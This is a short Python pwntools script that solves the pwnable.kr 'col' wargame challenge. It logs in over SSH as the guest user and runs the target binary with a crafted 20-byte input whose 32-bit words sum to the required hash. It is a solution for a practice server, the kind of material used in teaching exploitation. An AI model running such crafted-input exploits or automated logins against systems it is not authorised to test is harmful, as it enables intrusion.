from pwn import *
from pwnlib.util.packing import *
r = ssh('col', 'pwnable.kr', 2222, 'guest')
b = b'\x01' * 16
b += p32(0x21DD09EC - 67372036)
print(b)
print(sys.getsizeof(b))
payload = ['./col']+[b]
print(payload)
# exit()
fd = r.process(payload)
print(fd.recvall())
